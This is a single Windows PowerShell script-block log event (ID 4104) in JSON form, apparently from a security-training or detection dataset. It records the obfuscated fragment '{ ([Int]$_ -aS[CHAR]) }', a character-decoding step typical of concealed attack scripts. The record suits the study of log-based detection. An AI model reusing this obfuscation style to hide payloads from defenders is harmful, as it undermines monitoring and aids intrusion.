{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:22.178889Z"},"EventRecordID":607740,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-B603-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ ([Int]$_ -aS[CHAR]) }","ScriptBlockId":"1e6bf882-bb69-48a9-b02d-230a4228c91b","Path":""}}}
